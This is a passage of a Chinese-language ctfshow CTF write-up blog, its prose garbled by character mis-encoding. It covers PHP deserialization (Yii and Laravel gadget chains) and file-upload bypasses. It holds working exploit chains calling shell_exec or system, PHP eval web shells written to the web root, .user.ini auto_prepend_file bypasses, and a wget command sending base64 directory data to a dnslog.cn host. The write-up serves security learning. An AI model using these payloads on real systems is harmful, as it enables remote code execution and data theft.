class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>destructä¼šåœ¨è„šæœ¬ç»“æŸåé”€æ¯,è€ŒæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•ç«‹å³æ‰§è¡Œdestruct,æ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå¿«é€Ÿææ„</p><p>åŸç†:å½“phpæ¥æ”¶åˆ°ç•¸å½¢åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼ŒPHPç”±äºå…¶å®¹é”™æœºåˆ¶ï¼Œä¾ç„¶å¯ä»¥ååºåˆ—åŒ–æˆåŠŸã€‚ä½†æ˜¯ï¼Œç”±äºä½ ç»™çš„æ˜¯ä¸€ä¸ªç•¸å½¢çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæ€»ä¹‹ä»–æ˜¯ä¸æ ‡å‡†çš„ï¼Œæ‰€ä»¥PHPå¯¹è¿™ä¸ªç•¸å½¢åºåˆ—åŒ–å­—ç¬¦ä¸²å¾—åˆ°çš„å¯¹è±¡ä¸æ”¾å¿ƒï¼Œäºæ˜¯PHPå°±è¦èµ¶ç´§æŠŠå®ƒæ¸…ç†æ‰ï¼Œé‚£ä¹ˆå°±è§¦å‘äº†ä»–çš„ææ„æ–¹æ³•ã€‚</p><p>æ–¹æ³•<br>1.æ”¹æ‰å±æ€§çš„ä¸ªæ•°<br>2.åˆ æ‰ç»“å°¾çš„}</p><p><img src="/images/BVJ1Z47R.png"></p><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>æºç æœ€ä¸‹é¢å‘ç°ä½¿ç”¨äº†yiiæ¡†æ¶<br><img src="/images/D0KN2.png"><br>é€šè¿‡admin&#x2F;adminç™»å½•ï¼Œåœ¨å‡ ä¸ªé¡µé¢ä¸­æŒ¨ä¸ªæŸ¥çœ‹æºç <br>åœ¨aboutä¸­å‘ç°æ³¨é‡Šçš„æºç <code>&lt;!--?view-source --&gt;</code><br>åœ¨åé¢getä¼ æ•°æ®<code>/index.php?r=site%2Fabout&amp;view-source</code><br>å¾—åˆ°ä¸€ä¸ªæ–°çš„ä»£ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/backdoor/</span>shell<br>unserialize(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>ç»§ç»­è¿›å…¥<code>?r=backdoor/shell&amp;code=123</code><br>æŠ¥é”™äº†<br>æ‰¾ä¸€ä¸ªyiiåˆ©ç”¨é“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">CreateAction</span>&#123;<br>        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>\<span class="hljs-title class_">CreateAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateAction</span>(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title class_">echo</span> <span class="hljs-title class_">base64_encode</span>(<span class="hljs-title class_">serialize</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">BatchQueryResult</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/JH41.png"></p><p>systemè¢«è¿‡æ»¤äº†</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __construct()&#123;<br>           $<span class="hljs-keyword">this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;shell_exec&#x27;</span>;<br>           $<span class="hljs-keyword">this</span>-&gt;id = <span class="hljs-string">&#x27;wget `pwd|base64`.n2ybgz.dnslog.cn&#x27;</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<a href="http://www.dnslog.cn/">dnslog</a>å¾—åˆ°webç›®å½•&#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web(ç”¨base64è§£ç )<br><img src="/images/UKOS7.png"></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">public function __construct()&#123;</span><br><span class="language-xml">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="language-xml">            $this-&gt;id = &quot;echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[g]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/basic/web/3.php&quot;;</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="/images/W46.png"><br>è¿›å…¥3.php<br>payloadï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>å‰é¢æ­¥éª¤ä¸267ç›¸åŒï¼Œadmin&#x2F;adminç™»å½•<br>åœ¨è¾“å…¥codeæ—¶å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜yiié“¾è¢«ç¦ç”¨æˆ–è€…å…³é”®è¯è¢«è¿‡æ»¤<br>æ‰€ä»¥æœ¬é¢˜æ¢ä¸€ç§yiié“¾</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs scala">&lt;?php<br>namespace yii\rest &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">\yii\base\Action</span></span><br>    &#123;<br>        public $checkAccess;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span><br>    &#123;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;checkAccess = $func;<br>            $<span class="hljs-keyword">this</span>-&gt;id = $param;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace yii\web &#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span></span><br>    &#123;<br>        public $writeCallback;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span><br>    &#123;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> \yii\rest\<span class="hljs-type">IndexAction</span>($func, $param), <span class="hljs-string">&quot;run&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>namespace yii\base &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseObject</span></span><br>    &#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span><br>    &#123;<br>        public $id;<br>    &#125;<br>&#125;<br>namespace yii\db &#123;<br>    use yii\base\<span class="hljs-type">BaseObject</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseObject</span></span><br>    &#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> \yii\web\<span class="hljs-type">DbSession</span>($func, $param);<br>        &#125;<br>    &#125;<br>&#125;<br>namespace&#123;<br>    $exp = <span class="hljs-keyword">new</span> \yii\db\<span class="hljs-type">BatchQueryResult</span>(&#x27;shell_exec&#x27;, &#x27;echo <span class="hljs-string">&quot;&lt;?php eval(\$_POST[g]);?&gt;&quot;</span> &gt; /<span class="hljs-keyword">var</span>/www/html/basic/web/<span class="hljs-number">3.</span>php&#x27;);<br>    echo base64_encode(serialize($exp));<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è¿›å…¥3.php<br>payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flags&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>ä¸web268ç›¸åŒï¼Œä½¿ç”¨åŒæ ·çš„yiié“¾<br>è¿›å…¥3.php</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flagsa&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>ä¸web268ç›¸åŒï¼Œä½¿ç”¨åŒæ ·çš„yiié“¾<br>è¿›å…¥3.php</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flagsa&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>æ ¹æ® * Laravel - A PHP Framework For Web Artisanså¯çŸ¥ç”¨çš„æ˜¯Laravelæ¡†æ¶<br>Laravelæ¡†æ¶æœ‰ç›´æ¥å¯ä»¥ä½¿ç”¨çš„ååºåˆ—åŒ–é“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">PendingCommand</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$parameters</span>,<span class="hljs-variable">$class</span>,<span class="hljs-variable">$app</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test=<span class="hljs-variable">$class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-variable">$app</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Auth</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">GenericUser</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">attributes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$attributes</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;attributes = <span class="hljs-variable">$attributes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Application</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">hasBeenBootstrapped</span> = <span class="hljs-title class_">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bind</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bindings=<span class="hljs-variable">$bind</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title class_">genericuser</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Auth</span>\<span class="hljs-title class_">GenericUser</span>(<br>        <span class="hljs-title class_">array</span>(<br>            &quot;<span class="hljs-title class_">expectedOutput</span>&quot;=&gt;<span class="hljs-title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;<span class="hljs-title class_">expectedQuestions</span>&quot;=&gt;<span class="hljs-title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    <span class="hljs-variable">$application</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Illuminate\Foundation\Application</span>(<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;<br>                <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&quot;concrete&quot;</span>=&gt;<span class="hljs-string">&quot;Illuminate\Foundation\Application&quot;</span><br>                     )<br>             )<br>    );<br>    <span class="hljs-variable">$pendingcommand</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<br>        <span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;tac /f*&#x27;</span>),<br>        <span class="hljs-variable">$genericuser</span>,<br>        <span class="hljs-variable">$application</span><br>    );<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pendingcommand</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>webå…¥é—¨:æ–‡ä»¶ä¸Šä¼ </title>
    <link href="/2023/05/25/wenjianshangchuan/"/>
    <url>/2023/05/25/wenjianshangchuan/</url>
    
    <content type="html"><![CDATA[<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªè®°äº‹æœ¬,å†…å®¹ä¸º<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>ç„¶åä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºpngï¼Œå› ä¸ºé¢˜ç›®è¦æ±‚ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä¸Šä¼ æ—¶ä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…ï¼Œåœ¨burpsuitä¸Šä¿®æ”¹å°†åç¼€åæ”¹ä¸ºphp<br><img src="/images/Y8.png"><br>æ–‡ä»¶ä¸Šä¼ æˆåŠŸåï¼Œä¼šç»™ä½ ä½ åˆšæ‰ä¸Šä¼ çš„è·¯å¾„<br><img src="/images/79.png"><br>åœ¨urlä¸­è¾“å…¥ä»¥è¿›å…¥è·¯å¾„ï¼Œç„¶åå¤åˆ¶ç½‘å€<br><img src="/images/6h.png"><br>ä½¿ç”¨ä¸­å›½èšå‰‘è¿›å…¥æ–‡ä»¶æŸ¥è¯¢<br><img src="/images/87.png"><br>è·å–flag</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>åŒä¸Šï¼Œä¸€æ¨¡ä¸€æ ·</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>è¿™é¢˜ä¸èƒ½é€šè¿‡è¯¥burpsuiteä¸­æ–‡ä»¶çš„åç¼€æ¥è·å–flag</p><p>é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª.user.iniæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ”¹ä¸ºpngåç¼€å†æŠ“åŒ…ï¼Œä¿®æ”¹ï¼Œå†ä¸Šä¼ </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=1.png<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å†ä¸Šä¼ 1.png<br>å†…å®¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç”¨ä¸­å›½èšå‰‘è¿æ¥ï¼Œè¿æ¥åç¼€ä¸º&#x2F;upload&#x2F;index.php<br>è¿˜å¯ä»¥è¿™æ ·åš<br>å…ˆæ£€æŸ¥æœ¨é©¬æ˜¯å¦ä¸Šä¼ å®Œæ¯•<br><img src="/images/V2.png"><br>åœ¨index.phpè¿›è¡Œå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œè¯´æ˜æˆ‘ä»¬çš„æœ¨é©¬ä¸Šä¼ æˆåŠŸ<br>lså‘ç°å¹¶æ²¡æœ‰flag<br><img src="/images/2b.png"><br>æˆ‘ä»¬è¿”å›ä¸Šä¸€çº§è¯•è¯•<br><img src="/images/IP.png"><br>æˆåŠŸå‘ç°flag<br>å†æ¬¡post</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat ../flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å‘ç°flag</p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>é¦–å…ˆå†™å¥½ä¸€ä¸ª.user.iniæ–‡ä»¶<br>å†…å®¹ä¸ºauto_prepend_file&#x3D;1.pHp<br><strong>æ³¨ï¼šæœ¬é¢˜è¿‡æ»¤äº†phpï¼Œå› æ­¤ä½¿ç”¨å¤§å°å†™æ··å†™å¯ä»¥è·³è¿‡</strong><br>æŠŠ.user.iniæ–‡ä»¶æ·»åŠ pngåç¼€ä»¥æˆåŠŸæäº¤<br>åœ¨æäº¤æ—¶å¼€å¯burpsuite æŠ“åŒ…<br><img src="/images/6CQ02C.png"><br>åˆ é™¤.pngåç¼€<br><img src="/images/OHK.png"><br>æˆåŠŸæäº¤<br>å†å†™ä¸€ä¸ª1.pHpæ–‡ä»¶<br>å†…å®¹ä¸º<?pHp eval($_POST['a']);?><br>åŒæ ·çš„phpè¦å¤§å°å†™æ··ç”¨<br>æŠŠ1.pHpåç¼€æ”¹ä¸º1.png<br>ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼ŒæŠŠåç¼€.pngæ”¹ä¸º.pHp<br><img src="/images/0XC3.png"><br>æˆåŠŸä¸Šä¼ <br>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰“å¼€ä¸­å›½èšå‰‘<br><img src="/images/KAO6J.png"><br>æˆåŠŸè¿æ¥<br>åœ¨&#x2F;var&#x2F;www&#x2F;html&#x2F;ä¸­æ‰¾åˆ°flag.php<br>âœŒï¸</p><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>å…ˆä¸Šä¼ .user.ini.pngæ–‡ä»¶<br>å†…å®¹ä¸ºauto_prepend_file&#x3D;1.png<br><strong>æ³¨ï¼šæœ¬é¢˜è¿‡æ»¤äº†php</strong><br>æäº¤æ—¶å¼€å¯burpsuite æŠ“åŒ…<br>åˆ é™¤.pngåç¼€<br>æˆåŠŸæäº¤<br>å†å†™ä¸€ä¸ª1.pngæ–‡ä»¶<br>å†…å®¹ä¸º<code>&lt;?= eval($POST[&#39;a&#39;]);?&gt;</code><br>ç›´æ¥æäº¤<br>è¿™æ ·å†™è™½ç„¶èƒ½æˆåŠŸè¿æ¥ä¸­å›½èšå‰‘ä½†æ˜¯ä¸èƒ½è®¿é—®ï¼Œæ‰€ä»¥<br>è¿›å…¥&#x2F;upload&#x2F;index.phpè·¯å¾„<br>hackbarä¸­postæäº¤a&#x3D;system(â€œcat ..&#x2F;flag.phpâ€);<br>æ‰“å¼€æºç å³å¯çœ‹åˆ°flag</p><p>2<br>è™½ç„¶æœ¬é¢˜è¿‡æ»¤äº†phpï¼Œä½†å¯ä»¥ç”¨txt<br>ä¸Šä¼ .user.ini.pngæ–‡ä»¶<br>å†…å®¹ä¸ºauto_prepend_file&#x3D;1.txt<br>æŠ“åŒ…ï¼Œåˆ é™¤.pngåç¼€<br>æˆåŠŸæäº¤<br>å†™ä¸€ä¸ª1.pngæ–‡ä»¶<br>å†…å®¹åŒä¸Š<br>æŠ“åŒ…å°†pngåç¼€æ”¹ä¸º.txt<br>ä¸Šä¼ æˆåŠŸ<br>è¿™æ ·å°±èƒ½åœ¨ä¸­å›½èšå‰‘ä¸Šè®¿é—®äº†<br>åŒæ ·çš„flagåœ¨&#x2F;var&#x2F;www&#x2F;html&#x2F;ç›®å½•ä¸‹</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>ä¸Šä¼ 1.pngæ–‡ä»¶ å†…å®¹ä¸º <code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;);?&gt;</code><br>åœ¨burpsuiteé‡Œæ”¹ä¸º1.txt<br>è¿™é¢˜è¿‡æ»¤äº†phpè¿˜æœ‰[]ï¼Œæ‰€ä»¥[]ç”¨{}ä»£æ›¿<br>æ¥ä¸‹æ¥å°±å’Œä¸Šä¸€é¢˜ä¸€æ ·äº†<br>ä¸Šä¼ ä¸€ä¸ª.user.ini.png<br>å†…å®¹ä¸ºauto_prepend_file&#x3D;1.txt<br>æŠ“åŒ…åæ”¹ä¸º.user.ini<br>è¿›å…¥&#x2F;upload&#x2F;index.php 